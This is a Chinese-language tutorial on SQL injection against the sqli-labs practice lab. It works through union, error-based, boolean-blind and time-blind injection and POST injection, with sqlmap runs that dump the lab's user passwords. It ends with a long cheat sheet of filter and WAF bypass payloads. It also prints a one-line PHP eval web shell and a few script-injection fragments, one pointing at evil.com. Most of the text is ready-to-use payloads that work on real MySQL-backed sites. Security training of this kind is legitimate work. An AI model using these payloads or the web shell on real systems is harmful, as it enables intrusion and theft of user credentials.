---
title: SQL注入
author: Seso
date: 2024/05/6 10:05
categories:
 - SQL注入
 - sqli-labs
tags:
 - SQL注入
 - sqli-labs
---

# SQL注入

## 一、环境说明

sqli-labs的开源项目地址：https://github.com/Audi-1/sqli-labs

如下是使用docker部署的sqli-labs靶场环境

::: tip sqli-labs环境搭建

1. 拉取docker的镜像

```bash
┌──(root㉿DESKTOP-QSJ4HQV)-[~]
└─# docker pull acgpiano/sqli-labs
```

2. 然后使用docker run命令部署当前的靶机环境

```bash
┌──(root㉿DESKTOP-QSJ4HQV)-[~]
└─# docker run -d -it -p 80:80 acgpiano/sqli-labs:latest
c3849946776047b738ea0acea9d6493b5dfaa567a57cd9c5e793119d90dfaf6a

┌──(root㉿DESKTOP-QSJ4HQV)-[~]
└─# docker ps
 CONTAINER ID   IMAGE                       COMMAND     CREATED        STATUS        PORTS
             NAMES
c38499467760   acgpiano/sqli-labs:latest   "/run.sh"   1 second ago   Up 1 second   0.0.0.0:80->80/tcp, :::80->80/tcp, 3306/tcp   loving_wu
```

:::



## 二、SQL注入基本步骤

### 2.1 注入流程

> 思路流程：

1. 查找注入点
2. 判断是字符型还是数字型注入 and 1=1 1=2 / 3-1
3. 如果是字符型，找到他的闭合方式 `'`、`"`、`')`、`")`
4. 判断查询列数，group by或者使用order by都可以
5. 查询回显位置：-1



**闭合的作用**

手工提交闭合符号，结束前一段查询语句，后面即可加入其他语句，查询需要的参数不需要的语句可以用注释符号`--+`或`#`或`%23`注释掉

注释掉：**利用注释符号暂时将程序段脱离运行。把某段程序“注释掉”，就是让它暂时不运行（而非删除掉）**



### 2.2 union联合注入

我这里使用的是level-1的靶场，然后测试使用union联合注入

![image-20240506141538687](https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/image-20240506141538687.png?imageSlim)

这里测试的是有3列。

```sql
http://localhost/Less-1/index.php?id=1' group by 3--+
```

然后使用union联合注入查询：

- -1是为了能够查询回显位
- 通过group by判断查询的列，然后使用union去查询回显版本和数据库

```sql
union select 1,2,3--+

http://localhost/Less-1/index.php?id=-1' union select 1,version(),database()--+
```



::: tip 深入了解union注入过程

-  用到的关键数据库、数据表、数据列
- sql查询中group_concat的作用

:::



**拿到表名和列名**

如果使用单引号`'`闭合，可以使用--+。

![image-20240506145019010](https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/image-20240506145019010.png?imageSlim)

所需要表名信息在数据库information_schema->数据表tables->数据列table_name。

```sql
id=0' union select 1,table_name,3 from information_schema.tables--+
```

过滤security数据库中的表名，即table_schema为security的行

```sql
1' union select 1,table_name,3 from information_schema.tables where table_schema=database()--+
```

但是我要确保所有的查询信息能放到一行显示出来：

```sql
1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+
```

最后的结果是如图：

![image-20240506145953655](https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/image-20240506145953655.png?imageSlim)



但是如上并不完整，所以需要还需要查询当前的列

```sql
1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='users'--+
```



### 2.3 数字型union注入

<img src="https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/image-20240506150751216.png?imageSlim" alt="image-20240506150751216"  />

这里的环境使用level-2

![image-20240506151119505](https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/image-20240506151119505.png?imageSlim)

然后使用group by查看当前的列数：

> 注意： 这里是数字类型可以不需要封闭

```sql
id=2 group by 3--+
```

然后配合union

```sql
0 union select 1,database(),version()--+
```

然后其他的操作都是和如上一样。

如果括号中存在sql命令，会优先执行括号里面的，比如下面这种：

```sql
0 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 --+
```

然后查询所有的用户和密码：

```sql
0 union select 1,group_concat(username,password),2 from users --+
```



## 三、报错注入

### 3.1 什么是报错注入？

**报错注入**是一种SQL注入类型，用于使SQL语句报错的语法，用于注入结果无回显但错误信息有输出的情况。返回的错误信息即是攻击者需要的信息。所以当我们没有回显位时可以考虑报错注入这种方法来进行渗透测试。接下来带给大家常用的三种报错注入函数。

常见的报错注入：

1. 通过floor()报错注入
2. 通过extractValue() 报错注入
3. 通过updateXml()报错注入
4. 通过NAME_CONST() 报错注入
5. 通过jion()报错注入
6. 通过exp()报错注入

类似于这样的报错提示。

![image-20240506180724537](https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/image-20240506180724537.png?imageSlim)

### 3.2 利用extractValue()报错注入

```sql
100 and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+
```

然后虽然页面提示的是报错信息，但是已经包含了数据表：

![image-20240506181528697](https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/image-20240506181528697.png?imageSlim)

然后可以通过如下去查询当前的一些字段：

```sql
100 and 1=extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))) --+
```

但是默认只能返回32个字符串，所以这里需要使用substring解决这个问题：

```sql
100 and 1=extractvalue(1,concat(0x7e,(select substring(group_concat(username,'~',password),25,30) from users))) --+
```



### 3.3 利用updatexml()报错注入

```sql
1" and 1=updatexml(1,concat('~',(select group_concat(table_name) from information_schema.tables where table_schema = database())),3)--+
```

![image-20240506183524025](https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/image-20240506183524025.png?imageSlim)



## 四、布尔盲注

### 4.1 基本概念

盲注：页面没有报错回显，不知道数据库具体返回值的情况下，对数据库中的内容进行猜解，实行SQL注入。

::: tip 盲注分类

- 布尔盲注
- 时间盲注
- 报错盲注

:::

布尔盲注：web页面只返回True真，False假两种类型。利用页面返回不同，逐个猜解数据。

### 4.2 布尔盲注

**布尔盲注常用函数**

- `length(select database())>5 `里可以放查询语句,用来判断查询结果的长度
- `exists( )` 里可以放查询语句,用来判断查询结果是否存在
- `ascii( ) ` 里可以放查询语句,用来把查询结果转换为ascii的值
- `substr( string,pos,length)`  用来截取查询结果,string可以用查询语句代替,pos表示截取位置–下标从1开始,length表示截取的长度

> **布尔盲注的一般步骤**

```bash
1、判断数据库名的长度：
	and length(database())>7 回显正常；
	and length(database())>8 回显错误，说明数据库名是等于8个字符。
2、猜测数据库名（使用ascii码来依次判断）：
	and (ascii(substr(database(),1,1)))>115%23 通过不断测试，确定ascii值，查看asciii表可以得出该字符，
	通过改变database（）后面第一个数字，可以往后继续猜测第二个、第三个字母…
3、猜测表名：
	and (ascii(substr((select table_name from information_schema.tables where table.schema=database() limit 1,1)1,1)>144%23 
	往后继续猜测第二个、第三个字母…
4、猜测字段名（列名）：
	and (ascii(substr((select column_name from information_schema.columns where table.schema=database() and table_name=’数据库表名’ limit 0,1)1,1)>105%23 
	经过猜测 ascii为105为i也就是表的第一个列名id的第一个字母;
	同样,通过修改 limit 0,1 获取第二个列名 修改后面1,1的获取当前列的其他字段.
5、猜测字段内容：
	因为知道了列名，所以直接 select password from users 就可以获取password里面的内容，username也一样 
	and (ascii(substr(( select password from users limit 0,1),1,1)))=68--+

```

比如我当前使用的环境是level-8的

![image-20240507000113567](https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/image-20240507000113567.png)

1. 判断一下当前的数据库名的长度，如下测试到8是回显正常。

```sql
id=1' and length(database()) =8 --+
```

2. 然后猜测当前的数据库名（使用ascii码来依次判断）

```sql
http://localhost/Less-8/index.php?id=1’ and ascii(substr((database()),1,1)) =115%23 --+
```

但是这样子非常的浪费时间，所以这里可以直接使用工具sqlmap爆破：

```bash
┌──(root㉿Seso)-[~]
└─# sqlmap -u "http://localhost/Less-8/index.php?id=1" --batch --current-db

sqlmap identified the following injection point(s) with a total of 255 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 9480=9480 AND 'rwkp'='rwkp

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 3028 FROM (SELECT(SLEEP(5)))VwWo) AND 'vqIt'='vqIt
---
[00:26:27] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: PHP 5.5.9, Apache 2.4.7
back-end DBMS: MySQL >= 5.0.12
[00:26:27] [INFO] fetching current database
[00:26:27] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[00:26:27] [INFO] retrieved: security
current database: 'security'
[00:26:28] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/localhost'

[*] ending @ 00:26:28 /2024-05-07/
```

然后可以查询到当前的数据库名为security。

查询一下当前的数据库有哪些数据表，可以继续使用sqlmap工具爆破：

```bash
┌──(root㉿Seso)-[~]
└─# sqlmap -u "http://localhost/Less-8/?id=1" --batch -D security --tables

sqlmap identified the following injection point(s) with a total of 255 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 8575=8575 AND 'eElN'='eElN

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 8490 FROM (SELECT(SLEEP(5)))oSnA) AND 'AGxQ'='AGxQ
---
[00:30:23] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL >= 5.0.12
[00:30:23] [INFO] fetching tables for database: 'security'
[00:30:23] [INFO] fetching number of tables for database 'security'
[00:30:23] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[00:30:23] [INFO] retrieved: 4
[00:30:23] [INFO] retrieved: emails
[00:30:23] [INFO] retrieved: referers
[00:30:23] [INFO] retrieved: uagents
[00:30:23] [INFO] retrieved: users
Database: security
[4 tables]
+----------+
| emails   |
| referers |
| uagents  |
| users    |
+----------+
```

然后再基于当前的表，可以继续爆破表的数据：

```bash
┌──(root㉿Seso)-[~]
└─# sqlmap -u "http://localhost/Less-8/?id=1" --batch -D security -T users --dump

Database: security
Table: users
[13 entries]
+----+------------+----------+
| id | password   | username |
+----+------------+----------+
| 1  | Dumb       | Dumb     |
| 2  | I-kill-you | Angelina |
| 3  | p@ssword   | Dummy    |
| 4  | crappy     | secure   |
| 5  | stupidity  | stupid   |
| 6  | genious    | superman |
| 7  | mob!le     | batman   |
| 8  | admin      | admin    |
| 9  | admin1     | admin1   |
| 10 | admin2     | admin2   |
| 11 | admin3     | admin3   |
| 12 | dumbo      | dhakkan  |
| 14 | admin4     | admin4   |
+----+------------+----------+

[00:32:24] [INFO] table '`security`.users' dumped to CSV file '/root/.local/share/sqlmap/output/localhost/dump/security/users.csv'
[00:32:24] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/localhost'

[*] ending @ 00:32:24 /2024-05-07/
```



### 4.3 时间盲注

时间盲注：web页面只返回一个正常页面利用页面响应时间不同，逐个猜解数据。

前提是数据库会执行命令代码，只是不反馈页面信息。

:::tip 时间盲注常用函数

函数if (condition,true,false) condition为条件，true当条件为真的时返回的值，flase当条件为假时返回的值

```sql
select if(ascii(substr((select database()),1,1))>100,sleep(1),sleep(3)); 	
```

:::

通过时间响应判断当前的数据库名的长度：

```sql
id=1' and if(ascii(substr((select database()),1,1))>=120,sleep(0),sleep(3))--+
```



### 4.4 文件上传

使用如下命令查看当前的靶场或者是数据库是否开启了读写文件的权限：

```sql
MariaDB [(none)]> show variables like '%secure%';
+--------------------------+-------+
| Variable_name            | Value |
+--------------------------+-------+
| require_secure_transport | OFF   |
| secure_auth              | ON    |
| secure_file_priv         |       |
| secure_timestamp         | NO    |
+--------------------------+-------+
4 rows in set (0.001 sec)
```

![image-20240507154553628](https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/image-20240507154553628.png?imageSlim)

这里的靶场环境要使用level-7，然后测试注入：

```sql
id=1'))--+
```

这里涉及到了文件上传指令，也就是一句话木马：

```php
<?php @eval($_POST['password']);?>
```





## 五、POST注入

### 5.1 union注入

这里的环境使用level-11：

![image-20240507013805595](https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/image-20240507013805595.png)

我这里通过抓包，可以知道当前的数据的传参是如下：

![image-20240507013937803](https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/image-20240507013937803.png)

然后可以保证当前的uname的字段后面使用注入测试，并保证条件为真，也就是使用or。

```sql
uname=admin' union select 1,2 #&passwd=admin&submit=Submit
```

然后我这样就是登录成功的，后面的密码直接使用#号注释掉了。

![image-20240507014101914](https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/image-20240507014101914.png)

然后可以使用如下注入查看当前的数据库表：

```sql
uname=' union select 1,(select database()) #&passwd=admin&submit=Submit
```



### 5.2 报错注入

这里使用level-13的靶场进行测试，当前是提交用户`admin'`看是否报错，如果有报错，查看报错显示的闭合符号，然后推断出来是否使用`')`。

这个联合查询的目的是将数据库中的表数量和当前数据库的名称（通过 `(select database())` 获取）连接起来，并通过 `concat_ws` 函数使用破折号连接。而 `floor(rand(0)*2)` 则是生成一个随机数，作为联合查询中的一个列，以确保语法的正确性。

```sql
passwd=admin&submit=Submit&uname=admin') union select count(*),concat_ws('-',(select database()),floor(rand(0)*2)) as a from information_schema.tables group by a#
```

然后再修改concat_ws函数的第二个值：

```sql
passwd=admin&submit=Submit&uname=admin') union select count(*),concat_ws('-',(select table_name from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2)) as a from information_schema.tables group by a#
```

这样就可以使用报错注入查看当前的字段信息：

![image-20240507151057005](https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/image-20240507151057005.png?imageSlim)



### 5.3 盲注

> 第一种是布尔盲注

这里的盲注使用的是level-15的靶场环境，然后使用or的方式测试一下是否支持布尔盲注

```sql
passwd=admin&submit=Submit&uname=admin' or 1=2#
```

使用ascii函数进行post盲注和上面的get差不多。

- 继续使用ascii去测试当前的数据库的第一个字母的长度，测试到115是执行成功的，所以可以挨个进行测试。

```sql
passwd=admin&submit=Submit&uname=admin' or ascii(substring((select database()),1,1))=115#
```

 

> 第二种是时间盲注

使用if函数配合ascii函数实现的时间盲注。

```sql
passwd=admin&submit=Submit&uname=admin' or if(ascii(substring((select database()),1,1))>=115,sleep(0),sleep(2))#
```



## 六、SQL注入绕过

### 6.1 注释符号过滤

在思考后端怎么去写一条sql查询语句的时候，比如根据当前的id 查询：

- 在如下的查询语句中，其实`$id`被单引号包裹起来的，怎么去写注入都不行，因为是注释掉了，所以这里需要绕过这种注释符号

```sql
sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1"
```

常用的注释符号

- `--`
- `#`
- `%23`
- `--+`

有些网站源代码会直接替换掉注释符号：

![image-20240507162425151](https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/image-20240507162425151.png?imageSlim)

```sql
id=-1' union select 1,(select database()),3 or '1'='1
```

如下是数字型和字符型的绕过：

![image-20240507162818338](https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/image-20240507162818338.png?imageSlim)



### 6.2 and和or绕过

and为同时满足两个条件。例如测试字符型/数字型时用到and1=1和and1=2语句。or为满足其中一个条件即可。例如报错注入时会用到or语句。



**绕过思路**

- 使用大小写绕过
- 复写过滤字符
- 用&&取代and，用||取代or

这里的环境使用level-25。

![image-20240507163318101](https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/image-20240507163318101.png?imageSlim)

```sql
?id = 1

?id=1 and 1=1

?id=1 anD 1=1

?id=1 anandd 1=1

?id=1 && 1=1

?id=1 %26%26 1=1
```



### 6.3 空格过滤

**绕过思路**

- 使用+号代替空格
- 使用URL编码代替空格

```bash
spaces=======%20
TAB 09 horizontal TAB=======%09
LF OA newline=====%0A
FF 0C new page=====%0C
CR 0D carriage return======%0D
VT 0B vertical TAB========%0B
-OA-(MySQL only)==========%A0
```

或者使用括号对空格进行绕过：

如果空格被过滤，括号没有被过滤，可以用括号绕过。

在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。

```sql
select(user())from dual where(1=1)and(2=2)
```

这种过滤方法常常用于time based盲注,例如：

```sql
?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23
```



### 6.4 逗号过滤

在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决：

```sql
select substr(database() from 1 for 1);
select mid(database() from 1 for 1);
```

使用join：

```sql
union select 1,2     #等价于
union select * from (select 1)a join (select 2)b
```

使用like：

```sql
select ascii(mid(user(),1,1))=80   #等价于
select user() like 'r%'
```

对于limit可以使用offset来绕过：

```sql
select * from news limit 0,1

select * from news limit 1 offset 0
```



### 6.5 union和select过滤

**基本绕过思路**

- 尝试大小写绕过
- 尝试复写单词绕过

```sql
uNIoN sel<>ect # 程序过滤<>为空 脚本处理
uNi//on sele//ct # 程序过滤//为空
uNIoN /!%53eLEct/ # url 编码与内联注释
uNIoN se%0blect # 使用空格绕过
uNIoN sele%ct # 使用百分号绕过
uNIoN %53eLEct # 编码绕过
uNIoN sELecT 1,2 #大小写绕过
uNIoN all select 1,2 # ALL绕过
uNIoN DISTINCT select 1,2 # 去重复DISTINCT 绕过
null+UNION+SELECT+1,2 # 加号代替空格绕过
/!union//!select/1,2 # 内联注释绕过
/!50000union//!50000select/1,2 # 内联注释绕过
uNIoN//select/**/1,2 # 注释代替空格绕过
```



::: tip 如下是一些常用的绕过姿势

SQL注入绕过速查表

:::

## 七、SQL注入绕过速查表

#### 过滤and or

```sql
or     ——>    ||
and     ——>    &&
xor	——>	|   
not	——>	!

十六进制绕过
or ——> o\x72

大小写绕过
Or
aNd

双写绕过
oorr
anandd

urlencode，ascii(char)，hex，unicode编码绕过
    一些unicode编码举例：
    单引号：'
    %u0027 %u02b9 %u02bc
    %u02c8 %u2032
    %uff07 %c0%27
    %c0%a7 %e0%80%a7
   
    
关键字内联注释尝试绕所有
/*!or*/
/*!and*/
```



#### 左括号过滤

```sql
urlencode，ascii(char)，hex，unicode编码绕过
%u0028 %uff08
%c0%28 %c0%a8
%e0%80%a8
```



#### 右括号过滤

```sql
urlencode，ascii(char)，hex，unicode编码绕过
%u0029 %uff09
%c0%29 %c0%a9
%e0%80%a9
```



#### 过滤union\select

```sql
逻辑绕过
例：
过滤代码 union select user,password from users
绕过方式 1 && (select user from users where userid=1)='admin'

十六进制字符绕过
select ——> selec\x74
union——>unio\x6e

大小写绕过
SelEct

双写绕过
selselectect
uniunionon

urlencode，ascii(char)，hex，unicode编码绕过

关键字内联绕所有
/*!union*/
/*!select*/
```



#### 过滤空格

```sql
用Tab代替空格%20 %09 %0a %0b %0c %0d %a0 /**/()
绕过空格注释符绕过//--%20/**/#--+-- -;%00;

空白字符绕过SQLite3  ——     0A,0D,0c,09,20
MYSQL
	09,0A,0B,0B,0D,A0,20
PosgressSQL
	0A,0D,0C,09,20
Oracle_11g
	00,0A,0D,0C,09,20
MSSQL
	01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,OF,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20
特殊符号绕过
	`  +  ！
等科学计数法绕过
	例：
	select user,password from users where user_id0e1union select 1,2
unicode编码
    %u0020 %uff00
    %c0%20 %c0%a0 %e0%80%a0
```



#### 过滤=

```sql
?id=1' or 1 like 1#可以绕过对 = > 等过滤
or '1' IN ('1234')#可以替代=
```



#### 过滤比较符`<>`

```sql
select*fromuserswhereid=1and ascii(substr(database(),0,1))>64

select*fromuserswhereid=1and greatest(ascii(substr(database(),0,1)),64)=64
```



#### 过滤where

```sql
逻辑绕过
过滤代码 1 && (select user from users where user_id = 1) = 'admin'
绕过方式 1 && (select user from users limit 1) = 'admin'
```



#### 过滤limit

```sql
逻辑绕过
过滤代码 1 && (select user from users limit 1) = 'admin'
绕过方式 1 && (select user from users group by user_id having user_id = 1) = 'admin'#user_id聚合中user_id为1的user为admin
```



#### 过滤group by

```sql
逻辑绕过
过滤代码 1 && (select user from users group by user_id having user_id = 1) = 'admin'
绕过方式 1 && (select substr(group_concat(user_id),1,1) user from users ) = 1
```



#### 过滤select

```sql
逻辑绕过
过滤代码 1 && (select substr(group_concat(user_id),1,1) user from users ) = 1
绕过方式 1 && substr(user,1,1) = 'a'
```



#### 过滤’(单引号)

```sql
逻辑绕过
waf = 'and|or|union|where|limit|group by|select|\''
过滤代码 1 && substr(user,1,1) = 'a'
绕过方式 1 && user_id is not null1 && substr(user,1,1) = 0x611 && substr(user,1,1) = unhex(61)


宽字节绕过
%bf%27 %df%27 %aa%27
```



#### 过滤逗号

```sql
在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决：
selectsubstr(database(0from1for1);selectmid(database(0from1for1);

对于limit可以使用offset来绕过：

select*fromnews limit0,1# 等价于下面这条SQL语句select*fromnews limit1offset0
```



#### 过滤hex

```sql
逻辑绕过
过滤代码 1 && substr(user,1,1) = unhex(61)
绕过方式 1 && substr(user,1,1) = lower(conv(11,10,16)) #十进制的11转化为十六进制，并小写。
```



#### 过滤substr

```sql
逻辑绕过

过滤代码 1 && substr(user,1,1) = lower(conv(11,10,16)) 
绕过方式 1 && lpad(user(),1,1) in 'r'
```



#### 编码绕过

利用urlencode，ascii(char)，hex，unicode等编码绕过

```sql
or 1=1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。

十六进制编码
SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))

双重编码绕过
?id=1%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/1,2,password%252f%252a*/FROM%252f%252a*/Users--+
```



#### 等价函数或变量

```sql
hex()、bin() ==> ascii()

sleep() ==>benchmark()

concat_ws()==>group_concat()

mid()、substr() ==> substring()

@@user ==> user()

@@datadir ==> datadir()

举例：substring()和substr()无法使用时：?id=1 and ascii(lower(mid((select pwd from users limit 1,1),1,1)))=74　

或者：
substr((select 'password'),1,1) = 0x70
strcmp(left('password',1), 0x69) = 1
strcmp(left('password',1), 0x70) = 0
strcmp(left('password',1), 0x71) = -1
```



#### 生僻函数

```sql
MySQL/PostgreSQL支持XML函数：Select UpdateXML(‘<script x=_></script> ’,’/script/@x/’,’src=//evil.com’);　　　　　　　　　　

?id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1))

SELECT xmlelement(name img,xmlattributes(1as src,'a\l\x65rt(1)'as \117n\x65rror));　//postgresql

?id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));

and 1=(updatexml(1,concat(0x5c,(select user()),0x5c),1))

and extractvalue(1, concat(0x5c, (select user()),0x5c))
```

#### `\N`绕过

`\N`相当于NULL字符

```sql
select * from users where id=8E0union select 1,2,3,4,5,6,7,8,9,0
select * from users where id=8.0union select 1,2,3,4,5,6,7,8,9,0
select * from users where id=\Nunion select 1,2,3,4,5,6,7,8,9,0
```



#### PCRE绕过

```SQL注入绕过速查表
PHP 的 pcre.backtrack_limit 限制利用
union/*aaaaaaaxN*/select
```
